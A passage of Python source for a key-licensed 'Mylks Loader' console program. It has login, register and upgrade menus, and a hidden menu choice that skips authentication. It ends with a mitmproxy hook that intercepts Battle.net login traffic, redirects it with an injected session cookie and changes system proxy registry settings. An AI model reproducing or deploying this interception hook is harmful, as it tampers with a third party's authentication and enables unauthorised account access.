                                print(Center.XCenter(Colorate.Horizontal(
                                    Colors.white_to_red, "Failed!", 1)))
                                return False
                    except Exception as e:
                        print(F" Error: {e}")
                        return False
                else:
                    message = response.json()["message"]
                    print(f" Error: {message}")
                    return False
            else:
                print(Center.XCenter(Colorate.Horizontal(
                    Colors.white_to_red, "Failed!", 1)))
                return False
    except Exception as e:
        print(F" Error: {e}")
        return False

def main() -> None:
    choice = ""
    clear()
    os.system("title Mylks Loader - Main Menu")
    print()
    printLLogo()
    print()
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_white, " Welcome!", 1)))
    print()
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [1] Login", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [2] Register", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [3] Upgrade", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_blue, " [4] Exit", 1)))
    print(Center.XCenter(Colorate.Horizontal(
        Colors.white_to_green, "\n Choose a number", 1)))
    choice = input("\n > ")

    if choice == "1":
        clear()
        os.system("title Mylks Loader - Login Menu")
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Username:", 1)))
        username = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Password:", 1)))
        password = input()
        response = login(username, password)
        if response:
            clear()
            my_app.menu()
            # current_dir = os.getcwd()
            # folder_name = "tools"
            # folder_path = os.path.join(current_dir, folder_name)
            # batch_file_name = f"mitmdump -s {folder_path}\\app.py -q"

            # os.system(batch_file_name)
        else:
            time.sleep(3)
            clear()
            os.system("title Mylks Loader - Auth Error")
            print()
            print(Center.XCenter(Colorate.Horizontal(
                Colors.white_to_red, " Auth Error! Check your credentials!", 1)))
            time.sleep(3)
            main()

    if choice == "2":
        clear()
        os.system("title Mylks Loader - Register Menu")
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Username: ", 1)))
        username = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Password: ", 1)))
        password = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Key: ", 1)))
        key = input()
        response = register(username, password, key)
        if response:
            clear()
            my_app.menu()
            # current_dir = os.getcwd()
            # folder_name = "tools"
            # folder_path = os.path.join(current_dir, folder_name)
            # batch_file_name = f"mitmdump -s {folder_path}\\app.py -q"

            # os.system(batch_file_name)
        else:
            time.sleep(3)
            clear()
            os.system("title Mylks Loader - Auth Error")
            print()
            print(Center.XCenter(Colorate.Horizontal(
                Colors.white_to_red, " Wrong Key!", 1)))
            time.sleep(3)
            main()

    if choice == "3":
        clear()
        os.system("title Mylks Loader - Upgrade Menu")
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Username: ", 1)))
        username = input()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Key: ", 1)))
        key = input()
        response = upgrade(username, key)
        if response:
            clear()
            my_app.menu()
            # current_dir = os.getcwd()
            # folder_name = "tools"
            # folder_path = os.path.join(current_dir, folder_name)
            # batch_file_name = f"mitmdump -s {folder_path}\\app.py -q"

            # os.system(batch_file_name)
        else:
            time.sleep(3)
            clear()
            os.system("title Mylks Loader - Auth Error")
            print()
            print(Center.XCenter(Colorate.Horizontal(
                Colors.white_to_red, " Wrong Key or Username!", 1)))
            time.sleep(3)
            main()

    if choice == "4":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_red, " Goodbye...", 1)))
        time.sleep(2)
        exit()

    if choice == "5":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " No website at this time...", 1)))
        time.sleep(2)
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Back to main menu...", 1)))
        main()

    if choice == "6":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " No discord at this time......", 1)))
        time.sleep(2)
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_green, " Back to main menu...", 1)))
        main()

    if choice == "9":
        clear()
        my_app.menu()

    if choice != "1" and choice != "2" and choice != "3" and choice != "4" and choice != "5" and choice != "6" and choice != "9":
        clear()
        print()
        print(Center.XCenter(Colorate.Horizontal(
            Colors.white_to_red, " Invalid Choice!", 1)))
        time.sleep(2)
        main()

################################################################################################

my_app = app()
my_bNet_app = bNet(my_app)
main()

def response(flow: http.HTTPFlow):
    if 'account.battle.net/login/en/login.app?app=app' in flow.request.url and flow.request.method == 'GET':
        flow.response.headers["location"] = f'http://localhost:0/?ST={loginCookie}'
        flow.response.status_code = 302
    elif 'oauth.battle.net/oauth/authorize' in flow.request.url:
        p.enable = False
        p.registry_write()
    